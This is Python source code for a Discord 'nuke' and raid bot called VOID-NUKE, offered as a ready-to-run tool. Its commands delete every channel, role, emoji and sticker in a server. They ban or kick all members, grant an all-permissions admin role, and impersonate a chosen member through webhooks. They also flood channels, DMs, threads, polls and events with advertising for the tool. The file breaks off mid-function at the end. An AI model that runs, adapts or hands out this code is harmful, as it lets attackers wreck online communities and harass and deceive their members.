"""
VOID-NUKE WEB - Complete Bot Core - 100% Feature Parity with original
Original: https://github.com/v0id4real/Void-Nuke
Optimized for Render Free Tier: 512MB RAM, 0.1 CPU

FIXES:
- audioop missing in Python 3.13 -> audioop-lts shim
- All 39 original commands implemented
- Low RAM + low CPU optimizations
"""

# --- Python 3.13 audioop fix - MUST be first ---
import sys
try:
    import audioop  # noqa
except ModuleNotFoundError:
    try:
        import audioop_lts as audioop  # type: ignore
        sys.modules['audioop'] = audioop
        print("[FIX] audioop not found, using audioop-lts shim")
    except ImportError:
        # Create dummy module to prevent discord.py crash if not using voice
        import types
        audioop = types.ModuleType("audioop")
        sys.modules['audioop'] = audioop
        print("[WARN] audioop and audioop-lts missing, voice features disabled")

import asyncio
import random
import gc
import time
import json
import re
import urllib.request
from datetime import datetime, timezone, timedelta
from collections import deque
import discord
from discord.ext import commands
import aiohttp

# --- Original Config (100% from main.py) ---
TELEGRAM_URL = "https://t.me/v0idtool"
TELEGRAM_TAG = "t.me/v0idtool"
DISCORD_URL = "https://discord.gg/voidv2"
DISCORD_TAG = "discord.gg/voidv2"
GITHUB_URL = "https://github.com/v0id4real/Void-Nuke"

PUB = f"||@everyone|| **# RAID BY VOID-NUKE** : {TELEGRAM_TAG} · {DISCORD_TAG} <{GITHUB_URL}>"
PUB_SHORT = f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/v0id4real"
RAID_NAME = "raid-by-void"
TOOL_NAME = "VOID-NUKE"

AUTO_RAID_CONFIG = {
    "channel_type": "text",
    "channel_name": RAID_NAME,
    "num_channels": 50,
    "num_messages": 10,
    "message_content": PUB,
}

EMBED_CONFIG = {
    "title": "💀 __VOID-NUKE__",
    "description": (
        "**Ton serveur vient d'être raid par VOID-NUKE.**\n\n"
        "_ _\n"
        f"**> {TELEGRAM_TAG}**\n"
        f"**> {DISCORD_TAG}**\n"
        "**> github.com/v0id4real**\n"
        "_ _\n"
        "||@everyone||"
    ),
    "color": 0xFF0000,
    "message": f"||@everyone|| {PUB}",
    "image": "https://media.discordapp.net/attachments/1471977538648674478/1477637266791727155/c51ca65be8fa86b4b8f29a7d15dce335_1.webp",
    "footer": f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/v0id4real",
    "fields": [
        {"name": "📱 __Telegram__", "value": f"**{TELEGRAM_TAG}**", "inline": True},
        {"name": "🔗 __Discord__", "value": f"**{DISCORD_TAG}**", "inline": True},
        {"name": "🐱 __Github__", "value": "**github.com/v0id4real**", "inline": True},
        {"name": "⚡ __Tool__", "value": "**VOID-NUKE v1.0.0**", "inline": True},
    ],
}

WEBHOOK_CONFIG = {"default_name": "VOID-NUKE"}
SERVER_CONFIG = {
    "new_name": "RAIDED BY VOID-NUKE",
    "new_icon": "",
    "new_description": f"{TELEGRAM_TAG} · {DISCORD_TAG}",
}
BOT_PRESENCE = {"type": "playing", "text": f"{TELEGRAM_TAG} · {DISCORD_TAG}"}

# Optimization for Render free tier
MAX_CONCURRENT = 3
SEM = asyncio.Semaphore(MAX_CONCURRENT)

# Skip lists (same as original)
NO_BAN_KICK_ID = []

# --- Logging ---
class LogBuffer:
    def __init__(self, maxlen=600):
        self.logs = deque(maxlen=maxlen)

    def add(self, level, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        entry = {"ts": ts, "level": level, "msg": str(msg)[:500], "full": f"[{ts}] [{level}] {msg}"}
        self.logs.append(entry)
        print(f"[{ts}] [{level}] {msg}", flush=True)
        return entry

    def get_all(self):
        return list(self.logs)

    def clear(self):
        self.logs.clear()

log_buffer = LogBuffer()

def log_ok(m): return log_buffer.add("OK", m)
def log_err(m): return log_buffer.add("ERR", m)
def log_warn(m): return log_buffer.add("WARN", m)
def log_info(m): return log_buffer.add("INFO", m)

# --- Webhook Logger (original feature) ---
_wh_logger_url: str = ""
_wh_logger_guild_id: int = 0
_wh_logger_active: bool = False

async def _dispatch_log(entry: str):
    if not _wh_logger_url:
        return
    try:
        payload = json.dumps({"content": entry[:1990], "username": "void-logger"})
        async with aiohttp.ClientSession() as session:
            async with session.post(_wh_logger_url, data=payload,
                                    headers={"Content-Type": "application/json"},
                                    timeout=aiohttp.ClientTimeout(total=5)) as resp:
                pass
    except:
        pass

# --- Bot Manager ---
class BotManager:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.bot = None
            cls._instance.loop = None
            cls._instance.guild_id = None
            cls._instance.connected = False
            cls._instance.guild_info = {}
        return cls._instance

    def get_guild(self):
        if not self.bot or not self.guild_id:
            return None
        try:
            return self.bot.get_guild(int(self.guild_id))
        except:
            return None

    async def _limited_gather(self, coros, return_exceptions=True):
        """Chunked gather to save RAM + CPU for 0.1 CPU free tier"""
        async def _wrap(coro):
            async with SEM:
                try:
                    return await coro
                except Exception as e:
                    if return_exceptions:
                        return e
                    raise
                finally:
                    await asyncio.sleep(0.25)

        results = []
        chunk_size = 8  # even smaller for 512MB
        for i in range(0, len(coros), chunk_size):
            chunk = coros[i:i+chunk_size]
            res = await asyncio.gather(*[_wrap(c) for c in chunk], return_exceptions=return_exceptions)
            results.extend(res)
            gc.collect()
            await asyncio.sleep(0.4)
        return results

# Helpers same as original
def _pub_append(content: str) -> str:
    if TELEGRAM_TAG in content or DISCORD_TAG in content or TELEGRAM_URL in content or DISCORD_URL in content:
        return content
    return f"{content}\n{PUB}"

async def delete_channel(c) -> bool:
    try:
        await c.delete()
        log_ok(f"#{c.name}")
        return True
    except discord.Forbidden:
        log_err(f"no perm #{c.name}")
    except discord.HTTPException as e:
        log_err(f"http{e.status} #{c.name}")
    return False

async def delete_role(r) -> bool:
    if r.is_default():
        return False
    try:
        await r.delete()
        log_ok(f"@{r.name}")
        return True
    except discord.Forbidden:
        log_err(f"no perm @{r.name}")
    except discord.HTTPException as e:
        log_err(f"http{e.status} @{r.name}")
    return False

async def create_channel(guild, typ, name):
    try:
        c = await guild.create_text_channel(name) if typ == 'text' else await guild.create_voice_channel(name)
        log_ok(f"#{c.name}")
        return c
    except discord.Forbidden:
        log_err(f"no perm create {typ}")
    except discord.HTTPException as e:
        log_err(f"http{e.status}")
    return None

async def _send_embed(target, everyone=False):
    try:
        cfg = EMBED_CONFIG
        e = discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
        for f in cfg["fields"]:
            e.add_field(name=f["name"], value=f["value"], inline=f.get("inline", False))
        if cfg["image"]:
            e.set_image(url=cfg["image"])
        e.set_footer(text=cfg["footer"])
        c = f"@everyone {cfg['message']}" if everyone else cfg['message']
        await target.send(content=c, embed=e)
        log_ok(f"embed -> {getattr(target, 'name', str(target))}")
    except Exception as ex:
        log_err(str(ex)[:200])

async def _send_to(chan, count, content, everyone):
    final = _pub_append(content)
    try:
        for i in range(count):
            if content.lower() == 'embed':
                await _send_embed(chan, everyone)
            else:
                await chan.send(final)
        log_ok(f"[{count}] #{chan.name}")
    except discord.Forbidden:
        log_err(f"no perm #{chan.name}")
    except discord.HTTPException as e:
        log_err(f"http{e.status} #{chan.name}")

def _skip(m, bot_id):
    if m.id == bot_id:
        return True
    if m.id in NO_BAN_KICK_ID:
        log_warn(f"skip {m.name}")
        return True
    return False

manager = BotManager()

# ============================================================================
# ALL 39 COMMANDS - 100% from original + optimized
# ============================================================================

async def cmd_nuke(self, params):
    g = self.get_guild()
    if not g:
        return log_err("guild not found")
    log_warn(f"NUKE {g.name} {len(g.channels)}ch/{len(g.roles)}roles")
    num = min(int(params.get("num_channels", 30)), 50)  # free tier safe default 30
    cr = await self._limited_gather([delete_channel(c) for c in list(g.channels)])
    rr = await self._limited_gather([delete_role(r) for r in list(g.roles)])
    log_ok(f"wiped {cr.count(True)} ch {rr.count(True)} roles")
    created = await self._limited_gather([g.create_text_channel(RAID_NAME) for _ in range(num)])
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} channels ready")

    async def _make_role():
        async with SEM:
            try:
                col = discord.Colour.from_rgb(random.randint(180, 255), 0, 0)
                await g.create_role(name="VOID-NUKE", colour=col)
                return True
            except:
                return False
    rr2 = await self._limited_gather([_make_role() for _ in range(num)])
    log_ok(f"{rr2.count(True)} roles VOID-NUKE")

    async def _raid_chan(chan):
        async with SEM:
            try:
                wh = await chan.create_webhook(name="VOID-NUKE TOOLS")
                for _ in range(3):
                    try:
                        await wh.send(content=PUB, username="VOID-NUKE TOOLS")
                    except:
                        pass
                try:
                    await wh.delete()
                except:
                    pass
                log_ok(f"spammed #{chan.name}")
            except Exception as e:
                log_err(f"#{chan.name} {str(e)[:80]}")
    await self._limited_gather([_raid_chan(c) for c in new_chans])
    log_ok(f"NUKE COMPLETE | {g.name}")
    gc.collect()

async def cmd_auto_raid(self, params):
    g = self.get_guild()
    if not g:
        return
    log_warn(f"AUTO RAID {g.name}")
    num_ch = min(int(params.get("num_channels", AUTO_RAID_CONFIG['num_channels'])), 50)
    num_msg = min(int(params.get("num_messages", 3)), 10)
    await self._limited_gather([delete_channel(c) for c in list(g.channels)])
    cr = await self._limited_gather([create_channel(g, AUTO_RAID_CONFIG['channel_type'], AUTO_RAID_CONFIG['channel_name']) for _ in range(num_ch)])
    async def _role():
        async with SEM:
            try:
                col = discord.Colour.from_rgb(random.randint(180, 255), 0, 0)
                await g.create_role(name="VOID-NUKE", colour=col)
                return True
            except:
                return False
    await self._limited_gather([_role() for _ in range(min(num_ch, 30))])
    log_ok(f"{min(num_ch,30)} roles VOID-NUKE")
    await self._limited_gather([_send_to(c, num_msg, AUTO_RAID_CONFIG['message_content'], False) for c in g.channels if isinstance(c, discord.TextChannel)])
    log_ok(f"AUTO RAID DONE | {g.name}")

async def cmd_ban_all(self, params):
    g = self.get_guild()
    if not g:
        return
    bot_id = self.bot.user.id if self.bot and self.bot.user else 0
    async def _b(m):
        if _skip(m, bot_id):
            return False
        async with SEM:
            try:
                await m.ban(reason=PUB_SHORT)
                log_ok(m.name)
                return True
            except discord.Forbidden:
                log_err(f"no perm {m.name}")
            except discord.HTTPException as e:
                log_err(f"http{e.status} {m.name}")
            return False
    r = await self._limited_gather([_b(m) for m in g.members])
    log_ok(f"BAN WAVE | {r.count(True)} banned")

async def cmd_kick_all(self, params):
    g = self.get_guild()
    if not g:
        return
    bot_id = self.bot.user.id if self.bot and self.bot.user else 0
    async def _k(m):
        if _skip(m, bot_id):
            return False
        async with SEM:
            try:
                await m.kick(reason=PUB_SHORT)
                log_ok(m.name)
                return True
            except:
                return False
    r = await self._limited_gather([_k(m) for m in g.members])
    log_ok(f"Kick {r.count(True)}")

async def cmd_mute_all(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        mins = int(params.get("minutes", 60))
    except:
        mins = 60
    until = datetime.now(timezone.utc) + timedelta(minutes=mins)
    async def _m(m):
        async with SEM:
            if m.bot or m.id in NO_BAN_KICK_ID:
                return False
            try:
                await m.timeout(until)
                log_ok(m.name)
                return True
            except:
                return False
    r = await self._limited_gather([_m(m) for m in g.members])
    log_ok(f"Mute {r.count(True)}")

async def cmd_unban_all(self, params):
    g = self.get_guild()
    if not g:
        return
    bans = [e async for e in g.bans()]
    log_info(f"{len(bans)} bans")
    if not bans:
        return
    async def _u(e):
        async with SEM:
            try:
                await g.unban(e.user)
                log_ok(e.user.name)
                return True
            except:
                return False
    r = await self._limited_gather([_u(e) for e in bans])
    log_ok(f"Unbanned {r.count(True)}")

async def cmd_delete_channels(self, params):
    g = self.get_guild()
    if not g:
        return
    r = await self._limited_gather([delete_channel(c) for c in list(g.channels)])
    log_ok(f"ALL CHANNELS DELETED | {r.count(True)}")

async def cmd_delete_emojis(self, params):
    g = self.get_guild()
    if not g:
        return
    emojis = list(g.emojis)
    if not emojis:
        return log_info("no emojis")
    async def _d(e):
        async with SEM:
            try:
                await e.delete()
                log_ok(f":{e.name}:")
                return True
            except:
                return False
    r = await self._limited_gather([_d(e) for e in emojis])
    log_ok(f"Del Emojis {r.count(True)}")

async def cmd_delete_stickers(self, params):
    g = self.get_guild()
    if not g:
        return
    st = list(g.stickers)
    if not st:
        return log_info("no stickers")
    async def _d(s):
        async with SEM:
            try:
                await s.delete()
                log_ok(s.name)
                return True
            except:
                return False
    r = await self._limited_gather([_d(s) for s in st])
    log_ok(f"Del Stickers {r.count(True)}")

async def cmd_create_channels(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        num = min(int(params.get("quantity", 5)), 50)
    except:
        return log_err("invalid quantity")
    typ = params.get("type", "text").lower()
    name = params.get("name", RAID_NAME)
    if typ not in ('text', 'voice'):
        return log_err("invalid type")
    r = await self._limited_gather([create_channel(g, typ, name) for _ in range(num)])
    log_ok(f"Created {sum(x is not None for x in r)}/{num}")

async def cmd_create_roles(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        num = min(int(params.get("quantity", 5)), 50)
    except:
        return log_err("invalid")
    name = params.get("name", "VOID-NUKE")
    async def _cr():
        async with SEM:
            try:
                col = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                r = await g.create_role(name=name, colour=col)
                log_ok(f"@{r.name}")
                return True
            except:
                return False
    r = await self._limited_gather([_cr() for _ in range(num)])
    log_ok(f"Create Roles {r.count(True)}")

async def cmd_create_cats(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("quantity", 3)), 20)
    except:
        return log_err("invalid")
    name = params.get("name", "VOID-NUKE")
    async def cc(i):
        async with SEM:
            try:
                await g.create_category(f"{name} {i+1}")
                log_ok(f"{name} {i+1}")
                return True
            except:
                return False
    r = await self._limited_gather([cc(i) for i in range(count)])
    log_ok(f"Create Cats {r.count(True)}")

async def cmd_rename_channels(self, params):
    g = self.get_guild()
    if not g:
        return
    name = params.get("name", RAID_NAME)
    async def rn(i, ch):
        async with SEM:
            if isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                try:
                    await ch.edit(name=f"{name}-{i+1}")
                    log_ok(f"{name}-{i+1}")
                    return True
                except:
                    return False
            return False
    r = await self._limited_gather([rn(i, ch) for i, ch in enumerate(g.channels)])
    log_ok(f"Rename Channels {r.count(True)}")

async def cmd_rename_roles(self, params):
    g = self.get_guild()
    if not g:
        return
    name = params.get("name", "VOID-NUKE")
    roles = [r for r in g.roles if not r.is_default()]
    async def rr(i, r):
        async with SEM:
            try:
                await r.edit(name=f"{name}-{i+1}")
                log_ok(f"@{name}-{i+1}")
                return True
            except:
                return False
    res = await self._limited_gather([rr(i, r) for i, r in enumerate(roles)])
    log_ok(f"Rename Roles {res.count(True)}")

async def cmd_edit_server(self, params):
    g = self.get_guild()
    if not g:
        return
    name = params.get("name", SERVER_CONFIG['new_name'])
    desc = params.get("description", SERVER_CONFIG['new_description'])
    icon_url = params.get("icon_url", "")
    ok = 0
    try:
        await g.edit(name=name)
        log_ok("name")
        ok += 1
    except Exception as e:
        log_err(f"name {str(e)[:80]}")
    try:
        await g.edit(description=desc)
        log_ok("desc")
        ok += 1
    except Exception as e:
        log_err(f"desc {str(e)[:80]}")
    if icon_url:
        try:
            with urllib.request.urlopen(icon_url) as res:
                await g.edit(icon=res.read())
            log_ok("icon")
            ok += 1
        except Exception as e:
            log_err(f"icon {str(e)[:80]}")
    log_ok(f"Edit Server {ok}")

async def cmd_rename_members(self, params):
    g = self.get_guild()
    if not g:
        return
    nick = params.get("name", f"VOID | {PUB_SHORT}")[:32] or None
    async def _n(m):
        async with SEM:
            if m.bot or m.id in NO_BAN_KICK_ID:
                return False
            try:
                await m.edit(nick=nick)
                log_ok(m.name)
                return True
            except:
                return False
    r = await self._limited_gather([_n(m) for m in g.members])
    log_ok(f"Rename Members {r.count(True)}")

async def cmd_fix_nicks(self, params):
    g = self.get_guild()
    if not g:
        return
    ok = fail = 0
    special = set("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
    for m in g.members:
        if m.bot:
            continue
        n = m.display_name
        if n and n[0] in special:
            clean = n.lstrip("".join(special)) or "void"
            try:
                async with SEM:
                    await m.edit(nick=clean)
                log_ok(f"{n} -> {clean}")
                ok += 1
                await asyncio.sleep(0.3)
            except:
                fail += 1
    if not ok:
        log_info("nothing to fix")
    log_ok(f"Fix Nicks {ok} ok {fail} err")

async def cmd_get_admin(self, params):
    g = self.get_guild()
    if not g:
        return
    target = params.get("user_id", "")
    try:
        col = discord.Colour.red()
        role = await g.create_role(name="VOID-NUKE ADMIN", colour=col, permissions=discord.Permissions.all())
    except Exception as e:
        return log_err(str(e)[:150])
    if not target:
        results = await self._limited_gather([m.add_roles(role) for m in g.members if not m.bot])
        ok = sum(not isinstance(r, Exception) for r in results)
        log_ok(f"Get Admin all {ok}")
    else:
        try:
            m = await g.fetch_member(int(target))
            await m.add_roles(role)
            log_ok(f"{m.name} -> admin")
        except Exception as e:
            log_err(str(e)[:150])

async def cmd_impersonate(self, params):
    g = self.get_guild()
    if not g:
        return
    tid = params.get("target_id", "")
    msg = params.get("message", "")
    cid_raw = params.get("channel_id", "")
    if not msg:
        return log_err("message required")
    try:
        target = await g.fetch_member(int(tid))
    except:
        return log_err("member not found")
    if cid_raw:
        try:
            cs = g.get_channel(int(cid_raw))
            if not cs or not isinstance(cs, discord.TextChannel):
                return log_err("channel not found or not text")
            tc = [cs]
        except ValueError:
            return log_err("invalid channel ID")
    else:
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    log_info(f"target {target.display_name} | {len(tc)} channel(s)")
    ok = fail = 0
    async with aiohttp.ClientSession() as session:
        for chan in tc:
            wh_obj = None
            try:
                async with SEM:
                    wh_obj = await chan.create_webhook(name=target.display_name[:32])
                    wh = discord.Webhook.from_url(wh_obj.url, session=session)
                    await wh.send(content=msg, username=target.display_name[:80], avatar_url=str(target.display_avatar.url))
                    await wh_obj.delete()
                log_ok(f"#{chan.name}")
                ok += 1
            except Exception as e:
                log_err(str(e)[:100])
                fail += 1
                if wh_obj:
                    try:
                        await wh_obj.delete()
                    except:
                        pass
    log_ok(f"Impersonate {ok} ok {fail} err")

async def cmd_ghost_ping(self, params):
    g = self.get_guild()
    if not g:
        return
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc:
        return log_err("no text channels")
    chan = tc[0]
    log_info(f"via #{chan.name}")
    ok = fail = 0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID:
            continue
        try:
            async with SEM:
                msg = await chan.send(f"<@{m.id}>")
                await msg.delete()
            log_ok(m.name)
            ok += 1
            await asyncio.sleep(0.25)
        except:
            fail += 1
    log_ok(f"Ghost Ping {ok} ok {fail} err")

async def cmd_strip_roles(self, params):
    g = self.get_guild()
    if not g:
        return
    ok = fail = 0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID:
            continue
        removable = [r for r in m.roles if not r.is_default()]
        if not removable:
            continue
        try:
            async with SEM:
                await m.remove_roles(*removable)
            log_ok(f"{m.name} -{len(removable)} roles")
            ok += 1
        except:
            fail += 1
    log_ok(f"Strip Roles {ok} ok {fail} err")

async def cmd_dm_all(self, params):
    g = self.get_guild()
    if not g:
        return
    content = params.get("content", PUB)
    async def _dm(m):
        async with SEM:
            if m.bot:
                return False
            try:
                await m.send(content)
                log_ok(m.name)
                return True
            except:
                return False
    r = await self._limited_gather([_dm(m) for m in g.members])
    log_ok(f"Message All {r.count(True)}")

async def cmd_dm_spam_user(self, params):
    g = self.get_guild()
    if not g:
        return
    uid = params.get("user_id", "")
    try:
        uid = int(uid)
    except ValueError:
        return log_err("ID invalide")
    try:
        count = min(int(params.get("count", 5)), 20)
    except ValueError:
        return log_err("nombre invalide")
    msg = params.get("content", PUB)
    target = None
    try:
        target = await g.fetch_member(uid)
    except Exception:
        try:
            target = await self.bot.fetch_user(uid)
        except Exception:
            return log_err(f"user {uid} introuvable")
    log_info(f"target {target} ({target.id}) {count} msgs")
    ok = fail = 0
    for i in range(count):
        try:
            async with SEM:
                await target.send(msg)
            log_ok(f"[{i+1}/{count}] {target.name}")
            ok += 1
        except discord.Forbidden:
            log_err(f"DMs fermés — {target.name}")
            fail += count - i
            break
        except discord.HTTPException as e:
            log_err(f"http{e.status}")
            fail += 1
        if (i + 1) % 5 == 0:
            await asyncio.sleep(0.6)
    log_ok(f"DM Spam User {ok} ok {fail} err")

async def cmd_webhook_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 2)), 5)
    except:
        count = 2
    content = params.get("content", PUB)
    everyone = False
    if content.lower() == 'embed':
        everyone = params.get("everyone", "no").lower() == 'yes'
    # spawn webhooks
    whs = await self._limited_gather([c.create_webhook(name=WEBHOOK_CONFIG["default_name"]) for c in g.channels if isinstance(c, discord.TextChannel)])
    whs = [w for w in whs if isinstance(w, discord.Webhook)]
    log_info(f"{len(whs)} webhooks")

    async def _send_wh(wh, count, content, everyone):
        async with SEM:
            final = _pub_append(content)
            try:
                for _ in range(count):
                    if content.lower() == 'embed':
                        await _send_embed(wh, everyone)
                    else:
                        await wh.send(content=final)
                log_ok(f"wh {wh.name}")
            except Exception as e:
                log_err(str(e)[:100])

    await self._limited_gather([_send_wh(wh, count, content, everyone) for wh in whs])
    log_ok(f"Webhook Spam {len(whs)*count}")

async def cmd_server_info(self, params):
    g = self.get_guild()
    if not g:
        return
    bans = [e async for e in g.bans()]
    info = {
        "name": g.name,
        "id": str(g.id),
        "owner": str(g.owner),
        "members": g.member_count,
        "bans": len(bans),
        "channels": len(g.channels),
        "text": len([c for c in g.channels if isinstance(c, discord.TextChannel)]),
        "voice": len([c for c in g.channels if isinstance(c, discord.VoiceChannel)]),
        "roles": len(g.roles),
        "emojis": len(g.emojis),
        "boosts": g.premium_subscription_count,
        "created": g.created_at.strftime('%Y-%m-%d'),
    }
    log_info(json.dumps(info, indent=2))
    return info

async def cmd_clone_server(self, params):
    g = self.get_guild()
    if not g:
        return
    cats = {}
    chans = []
    for ch in g.channels:
        if isinstance(ch, discord.CategoryChannel):
            cats[ch.id] = ch.name
        elif isinstance(ch, (discord.TextChannel, discord.VoiceChannel)):
            chans.append({"name": ch.name, "type": "text" if isinstance(ch, discord.TextChannel) else "voice", "category": cats.get(ch.category_id)})
    path = f"clone_{g.id}.json"
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"name": g.name, "channels": chans, "categories": list(cats.values())}, f, indent=2)
        log_ok(f"saved {path}")
    except Exception as e:
        log_err(str(e))
    log_ok(f"Clone {len(chans)} channels")
    return {"name": g.name, "channels": chans}

async def cmd_webhook_logger(self, params):
    global _wh_logger_url, _wh_logger_guild_id, _wh_logger_active
    g = self.get_guild()
    if not g:
        return
    url = params.get("webhook_url", "")
    if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
        return log_err("Invalid webhook URL")
    _wh_logger_url = url
    _wh_logger_guild_id = g.id
    _wh_logger_active = True
    await _dispatch_log(f"✅ **VOID-NUKE Logger activé** on `{g.name}`")
    log_ok(f"logger active -> {url[:55]}...")
    log_warn("remains active until bot disconnect")

async def cmd_lockdown(self, params):
    g = self.get_guild()
    if not g:
        return
    async def lock(ch):
        async with SEM:
            try:
                await ch.set_permissions(g.default_role, send_messages=False)
                log_ok(f"#{ch.name}")
                return True
            except:
                return False
    tcs = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    r = await self._limited_gather([lock(c) for c in tcs])
    log_ok(f"Lockdown {r.count(True)}")

async def cmd_deafen_all(self, params):
    g = self.get_guild()
    if not g:
        return
    async def df(m):
        async with SEM:
            if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                try:
                    await m.edit(deafen=True)
                    log_ok(m.name)
                    return True
                except:
                    return False
            return False
    r = await self._limited_gather([df(m) for m in g.members])
    log_ok(f"Deafen {r.count(True)}")

async def cmd_disconnect_all(self, params):
    g = self.get_guild()
    if not g:
        return
    async def dc(m):
        async with SEM:
            if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
                try:
                    await m.move_to(None)
                    log_ok(m.name)
                    return True
                except:
                    return False
            return False
    r = await self._limited_gather([dc(m) for m in g.members])
    log_ok(f"Kick VC {r.count(True)}")

async def cmd_mass_move(self, params):
    g = self.get_guild()
    if not g:
        return
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    if not vcs:
        return log_err("no voice channels")
    tid = params.get("target_id", "")
    if not tid:
        return log_err("target VC ID required")
    try:
        target = g.get_channel(int(tid))
        if not target or not isinstance(target, discord.VoiceChannel):
            return log_err("target VC not found")
    except:
        return log_err("invalid target ID")
    async def mv(m):
        async with SEM:
            if m.voice and m.voice.channel:
                try:
                    await m.move_to(target)
                    log_ok(f"{m.name} -> #{target.name}")
                    return True
                except:
                    return False
            return False
    r = await self._limited_gather([mv(m) for m in g.members])
    log_ok(f"Move VC {r.count(True)}")

async def cmd_invite_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 3)), 20)
    except:
        count = 3
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc:
        return log_err("no text channels")
    ok = fail = 0
    for _ in range(count):
        try:
            async with SEM:
                inv = await random.choice(tc).create_invite(max_age=60, max_uses=1, unique=True)
            log_ok(inv.url)
            ok += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            log_err(str(e)[:100])
            fail += 1
    log_ok(f"Invite Spam {ok}")

async def cmd_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 3)), 10)
    except:
        count = 3
    content = params.get("content", PUB)
    everyone = False
    if content.lower() == 'embed':
        everyone = params.get("everyone", "no").lower() == 'yes'
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    await self._limited_gather([_send_to(c, count, content, everyone) for c in tc])
    log_ok(f"Spam {count*len(tc)}")

async def cmd_thread_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 2)), 5)
    except:
        count = 2
    name = params.get("name", f"VOID-NUKE | {DISCORD_TAG}")
    ok = fail = 0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                async with SEM:
                    m = await chan.send(PUB)
                    await m.create_thread(name=f"{name} {i+1}")
                log_ok(f"#{chan.name} [{i+1}]")
                ok += 1
            except Exception as e:
                log_err(str(e)[:100])
                fail += 1
            await asyncio.sleep(0.3)
    log_ok(f"Thread Spam {ok}/{fail}")

async def cmd_reaction_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        limit = min(int(params.get("limit", 5)), 20)
    except:
        limit = 5
    void_emojis = ["🇻", "🇴", "🇮", "🇩", "🌀", "💫", "🗣", "🔓", "🔗"]
    ok = fail = 0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            async for msg in chan.history(limit=limit):
                for emoji in void_emojis:
                    try:
                        async with SEM:
                            await msg.add_reaction(emoji)
                        ok += 1
                        await asyncio.sleep(0.3)
                    except:
                        fail += 1
        except:
            pass
    log_ok(f"Reaction Spam {ok} ok {fail} err")

async def cmd_vc_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        loops = min(int(params.get("loops", 2)), 5)
    except:
        loops = 2
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    log_info(f"{len(vcs)} VCs")
    ok = fail = 0
    for vc in vcs:
        for i in range(loops):
            try:
                async with SEM:
                    conn = await vc.connect(timeout=3.0)
                    await asyncio.sleep(0.2)
                    await conn.disconnect(force=True)
                log_ok(f"[{i+1}/{loops}] #{vc.name}")
                ok += 1
            except Exception as e:
                log_err(str(e)[:100])
                fail += 1
            await asyncio.sleep(0.5)
    log_ok(f"Voice Spam {ok} ok {fail} err")

async def cmd_spoiler_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 2)), 10)
    except:
        count = 2
    content = params.get("content", PUB_SHORT)
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    wrapped = f"||{content}||\n{PUB}"
    await self._limited_gather([_send_to(c, count, wrapped, False) for c in tc])
    log_ok(f"Spoiler Spam {count*len(tc)}")

async def cmd_poll_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 2)), 10)
    except:
        count = 2
    question = params.get("question", f"Join VOID-NUKE | {PUB_SHORT}")
    ok = fail = 0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                async with SEM:
                    poll = discord.Poll(question=question[:300], duration=timedelta(hours=1))
                    poll.add_answer(text=DISCORD_TAG)
                    poll.add_answer(text="github.com/v0id4real")
                    await chan.send(poll=poll)
                log_ok(f"#{chan.name} [{i+1}]")
                ok += 1
            except Exception as e:
                log_err(str(e)[:120])
                fail += 1
            await asyncio.sleep(0.5)
    log_ok(f"Poll Spam {ok} ok {fail} err")

async def cmd_event_spam(self, params):
    g = self.get_guild()
    if not g:
        return
    try:
        count = min(int(params.get("count", 3)), 15)
    except:
        count = 3
    name = params.get("name", "VOID-NUKE TOOLS")
    desc = params.get("description", f"**RAIDED BY VOID-NUKE**\n{PUB_SHORT}")
    ok = fail = 0
    start = datetime.now(timezone.utc) + timedelta(hours=1)
    end_t = start + timedelta(hours=2)
    for i in range(count):
        try:
            async with SEM:
                await g.create_scheduled_event(name=f"{name} #{i+1}", description=desc,
                                               start_time=start+timedelta(minutes=i), end_time=end_t+timedelta(minutes=i),
                                               entity_type=discord.EntityType.external, location=PUB_SHORT,
                                               privacy_level=discord.PrivacyLevel.guild_only)
            log_ok(f"{name} #{i+1}")
            ok += 1
        except Exception as e:
            log_err(str(e)[:120])
            fail += 1
        await asyncio.sleep(0.5)
    log_ok(f"Event Spam {ok}")

# Webhook logger check - to be called from on_message
async def webhook_logger_check(message: discord.Message):
